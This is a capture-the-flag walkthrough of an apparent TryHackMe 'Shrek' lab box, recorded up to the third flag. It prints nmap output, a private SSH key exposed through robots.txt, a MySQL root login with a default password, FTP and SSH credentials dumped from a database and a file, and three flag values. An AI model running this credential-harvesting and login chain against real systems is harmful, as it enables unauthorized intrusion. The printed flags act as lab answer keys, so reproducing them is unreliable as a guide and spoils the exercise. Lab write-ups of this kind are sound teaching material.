[[nmap]] scan of box ip 
```bash
┌──(kali㉿kali)-[~]                                                                                                                 
└─$ nmap -sV -sC -v 10.10.209.23                                                                                                    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 09:12 EDT                                                                     
NSE: Loaded 155 scripts for scanning.                                                                                               
NSE: Script Pre-scanning.                                                                                                           
Initiating NSE at 09:12                                                                                                             
Completed NSE at 09:12, 0.00s elapsed                                                                                               
Initiating NSE at 09:12                                                                                                             
Completed NSE at 09:12, 0.00s elapsed                                                                                               
Initiating NSE at 09:12                                                                                                             
Completed NSE at 09:12, 0.00s elapsed                                                                                               
Initiating Ping Scan at 09:12                                                                                                       
Scanning 10.10.209.23 [2 ports]                                                                                                     
Completed Ping Scan at 09:12, 0.12s elapsed (1 total hosts)                                                                         
Initiating Parallel DNS resolution of 1 host. at 09:12                                                                              
Completed Parallel DNS resolution of 1 host. at 09:12, 0.10s elapsed                                                                
Initiating Connect Scan at 09:12                                                                                                    
Scanning 10.10.209.23 [1000 ports]                                                                                                  
Discovered open port 3306/tcp on 10.10.209.23                                                                                       
Discovered open port 80/tcp on 10.10.209.23                                                                                         
Discovered open port 22/tcp on 10.10.209.23                                                                                         
Discovered open port 21/tcp on 10.10.209.23                       
Discovered open port 8080/tcp on 10.10.209.23                     
Increasing send delay for 10.10.209.23 from 0 to 5 due to 80 out of 266 dropped probes since last increase.
Discovered open port 9999/tcp on 10.10.209.23                     
Discovered open port 8009/tcp on 10.10.209.23                     
Completed Connect Scan at 09:12, 15.64s elapsed (1000 total ports)
Initiating Service scan at 09:12                                  
Scanning 7 services on 10.10.209.23                               
Completed Service scan at 09:13, 90.95s elapsed (7 services on 1 host)                                                              
NSE: Script scanning 10.10.209.23.
Initiating NSE at 09:13          
Completed NSE at 09:13, 3.76s elapsed                             
Initiating NSE at 09:13          
Completed NSE at 09:13, 1.70s elapsed                             
Initiating NSE at 09:13          
Completed NSE at 09:13, 0.00s elapsed                             
Nmap scan report for 10.10.209.23                                 
Host is up (0.14s latency).      
Not shown: 993 closed tcp ports (conn-refused)                    
PORT     STATE SERVICE VERSION                                    
21/tcp   open  ftp     vsftpd 3.0.2                               
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)                 
| ssh-hostkey:                   
|   2048 19:cd:2a:1d:a1:fd:2b:82:c2:de:27:00:90:1b:52:a7 (RSA)    
|   256 dd:99:85:18:26:9c:3c:7e:87:32:df:2b:43:18:b8:b8 (ECDSA)   
|_  256 a2:35:a3:7b:19:af:58:31:fd:6c:40:55:59:4d:7d:52 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.1.33)   
|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).                                                                 
| http-robots.txt: 1 disallowed entry                             
|_/Cpxtpt2hWCee9VFa.txt          
| http-methods:                  
|   Supported Methods: GET HEAD POST OPTIONS TRACE                
|_  Potentially risky methods: TRACE                              
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.1.33            
3306/tcp open  mysql   MySQL (unauthorized)                       
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)               
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1        
|_http-title: Apache Tomcat/7.0.88                                
|_http-favicon: Apache Tomcat                                     
| http-methods:                  
|_  Supported Methods: GET HEAD POST OPTIONS                      
|_http-server-header: Apache-Coyote/1.1                           
9999/tcp open  abyss?            
| fingerprint-strings:           
|   FourOhFourRequest, GetRequest, HTTPOptions:                   
|     HTTP/1.0 200 OK            
|     Accept-Ranges: bytes       
|     Content-Length: 5          
|     Content-Type: text/plain; charset=utf-8                     
|     Last-Modified: Sat, 06 Aug 2022 13:09:21 GMT                
|     Date: Sat, 06 Aug 2022 13:12:29 GMT                         
|     7h30                       
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request                                    
|     Content-Type: text/plain; charset=utf-8                     
|     Connection: close          
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://n
map.org/cgi-bin/submit.cgi?new-service :                                                                                            
SF-Port9999-TCP:V=7.92%I=7%D=8/6%Time=62EE68BD%P=x86_64-pc-linux-gnu%r(Get                                                          
SF:Request,BD \"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nConten                                                          
SF:t-Length:\x205\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLast    
...
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x                                                          
SF:20close\r\n\r\n400\x20Bad\x20Request\");                                                                                          
Service Info: OS: Unix           

NSE: Script Post-scanning.       
Initiating NSE at 09:13          
Completed NSE at 09:13, 0.00s elapsed                             
Initiating NSE at 09:13          
Completed NSE at 09:13, 0.00s elapsed                             
Initiating NSE at 09:13          
Completed NSE at 09:13, 0.00s elapsed                             
Read data files from: /usr/bin/../share/nmap                      
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.25 seconds
```

### Note open port 80 for http
navigating to *ip*:80
	note shrek - assuming user
```html
<head>
<style>
html,body{
    margin:0;
    height:100%;
}
img{
  display:block;
  width:100%; height:100%;
  object-fit: cover;
}
</style>
</head>
<body>
<img src="shrek.png">
<!-- shrek is like an onion -->
<!-- NzM2ODcyNjU2bzY5NzM2MTZzNnI2OTZzNnI= -->

</body>
```

- robots.txt and file in nmap scan
	- navigating to *ip*/robots.txt 
	```html
	User-agent: *
	Disallow: /Cpxtpt2hWCee9VFa.txt
	```
	- navigating to *ip*/Cpxtpt2hWCee9VFa.txt
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
``` 
- create key and save as file
	- then change file permissions for ssh to connect
```bash
┌──(kali㉿kali)-[~/ctf/THM/shrek]                                                                                                   └─$ nano keyrobots.txt

┌──(kali㉿kali)-[~/ctf/THM/shrek]                                                                                                   └─$ chmod 600 keyrobots.txt 
```
- Log in a shrek - ls in for 1st flag
```bash
shrek@shrek ~]$ ls -aslp                                                                                                           total 20                                                                                                                            0 drwx------. 3 shrek shrek 127 Mar 12  2020 ./                                                                                     0 drwxr-xr-x. 5 root  root   45 Mar 11  2020 ../                                                                                    0 lrwxrwxrwx  1 root  root    9 Mar 12  2020 .bash_history -> /dev/null                                                             4 -rw-r--r--. 1 shrek shrek  18 Apr 10  2018 .bash_logout                                                                           4 -rw-r--r--. 1 shrek shrek 193 Apr 10  2018 .bash_profile                                                                          4 -rw-r--r--. 1 shrek shrek 231 Apr 10  2018 .bashrc
4 -rwx------  1 shrek shrek  35 Mar 12  2020 check.sh             
4 -r--------  1 shrek shrek  33 Mar 12  2020 flag.txt             
0 drwx------  2 shrek shrek  61 Mar 12  2020 .ssh/                
[shrek@shrek ~]$ cat flag.txt                                     0069ba233da89efe6f48e7d214034130
```
> [!FLAG 1]
> 0069ba233da89efe6f48e7d214034130

### Note open port 3306 MySQL
```bash
3306/tcp open  mysql   MySQL (unauthorized)
```
- Log into MySQL as Shrek by 
```bash
[shrek@shrek ~]$ mysql                                                                                                              Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                           Your MySQL connection id is 39                                                                                                      Server version: 5.6.47 MySQL Community Server (GPL)
...
mysql> show databases;                                                                                                              +--------------------+                                                                                                              | Database           |                                                                                                              +--------------------+                                                                                                              | information_schema |                                                                                                              +--------------------+
```
- log in as root with default setup password
- api database 
	- user ftp and password / ftp and EkRYje58bhFpg2uW
- cms database
	- flag
```bash
[shrek@shrek ~]$ mysql -u root -ppassword                         Warning: Using a password on the command line interface can be insecure.                                                            Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                           Your MySQL connection id is 45                                    Server version: 5.6.47 MySQL Community Server (GPL)

mysql> show Databases;                                                                                                              +--------------------+                                                                                                              | Database           |                                                                                                              +--------------------+                                                                                                              | information_schema |                                                                                                              | api                |                                                                                                              | cms                |                                                                                                              | mysql              |           
| performance_schema |                                            
+--------------------+                                            5 rows in set (0.00 sec)

mysql> use api;                 
Reading table information for completion of table and column names                                                                  You can turn off this feature to get a quicker startup with -A                                                                                                       Database changed                 

mysql> show tables;
+---------------+                
| Tables_in_api |                
+---------------+                
| users         |                
+---------------+                
1 row in set (0.00 sec)

mysql> SHOW COlUMNS FROM users;                                                                                            [69/1668]+-------+--------------+------+-----+---------+----------------+                                                                    | Field | Type         | Null | Key | Default | Extra          |                                                                    +-------+--------------+------+-----+---------+----------------+                                                                    | id    | int(11)      | NO   | PRI | NULL    | auto_increment |                                                                    | user  | varchar(100) | NO   |     | NULL    |                |                                                                    | pass  | varchar(80)  | NO   |     | NULL    |                |                                                                    +-------+--------------+------+-----+---------+----------------+                                                                    3 rows in set (0.00 sec)

mysql> SELECT * FROM users;      
+----+------+------------------+                                  
| id | user | pass             |                                  
+----+------+------------------+                                  
|  4 | ftp  | EkRYje58bhFpg2uW |                                  
+----+------+------------------+                                  
1 row in set (0.00 sec)

mysql> USE cms;                                                                                                            [49/1668]Reading table information for completion of table and column names                                                                  You can turn off this feature to get a quicker startup with -A                                                                      Database changed

mysql> show tables
-> ;                                                          
+--------------------------------+                                                                                                  | Tables_in_cms                  |                                                                                                  +--------------------------------+                                                                                                  | cms_additional_users           |                                                                                                  | cms_additional_users_seq       |                                                                                                  | cms_admin_bookmarks            |                                                                                                  | cms_admin_bookmarks_seq        |                                                                                                  ...
| cms_userplugins_seq            |                                                                                                  | cms_userprefs                  |                                                                                                  | cms_users                      |                                                                                                  | cms_users_seq                  |                                                                                                  | cms_version                    |                                                                                                  | flag                           |                                                                                                  +--------------------------------+                                                                                                  54 rows in set (0.00 sec)

mysql> SELECT * from flag;
+----------------------------------+
| Flag                             |
+----------------------------------+
| 877fe779d235694836c7f5478363974f |
+----------------------------------+
1 row in set (0.00 sec)
```
> [!FLAG 2]
>877fe779d235694836c7f5478363974f

- Using ftp - ftp and password
	- GET message.txt - downloads to the working directory from where you ftp'd in
```bash
┌──(kali㉿kali)-[~]
└─$ ftp ftp@10.10.209.23                                                                                      1 ⨯Connected to 10.10.209.23.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||10093|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              93 Mar 12  2020 message.txt
226 Directory send OK.
ftp> get message.txt
local: message.txt remote: message.txt
229 Entering Extended Passive Mode (|||10099|).
150 Opening BINARY mode data connection for message.txt (93 bytes).
100% |*********************************************************************|    93       86.90 KiB/s    00:00 ETA
226 Transfer complete.
93 bytes received in 00:00 (0.85 KiB/s)
```
- View the message.txt file
	- Donkey's password
```bash
┌──(kali㉿kali)-[~]                                           
└─$ cat message.txt                                           
Stop forgetting your password, Donkey! Next time I won\'t reset it! -Shrek               J5rURvCa8DyTg3vR
```
-ssh in using donkey and p/w
```bash
┌──(kali㉿kali)-[~]
└─$ ssh donkey@10.10.209.23                                 
127 ⨯donkey@10.10.209.23\'s password: *J5rURvCa8DyTg3vR*                               Last login: Sat Aug  6 09:08:58 2022 from ip-10-11-2-249.eu-west-1.compute.internal
[donkey@shrek ~]$ pwd
/home/donkey                     
[donkey@shrek ~]$ ls -aslp
total 16                         
0 drwx------  3 donkey donkey 110 Mar 12  2020 ./                 
0 drwxr-xr-x. 5 root   root    45 Mar 11  2020 ../                
0 lrwxrwxrwx  1 root   root     9 Mar 12  2020 .bash_history -> /dev/null
4 -rw-r--r--  1 donkey donkey  18 Apr 10  2018 .bash_logout       
4 -rw-r--r--  1 donkey donkey 193 Apr 10  2018 .bash_profile      
4 -rw-r--r--  1 donkey donkey 231 Apr 10  2018 .bashrc            
4 -r--------  1 donkey donkey  33 Mar 12  2020 flag.txt           
0 drwxr-xr-x  2 root   root    18 Mar 12  2020 ftp/               
[donkey@shrek ~]$ cat flag.txt 
974acecd51cc45c843062fdac6235e97
```
> [!FLAG 3]
> 974acecd51cc45c843062fdac6235e97

Oh and @RealTryHackMe 3 flags down on the Shrek box. Get the remaining 5 tomorrow morning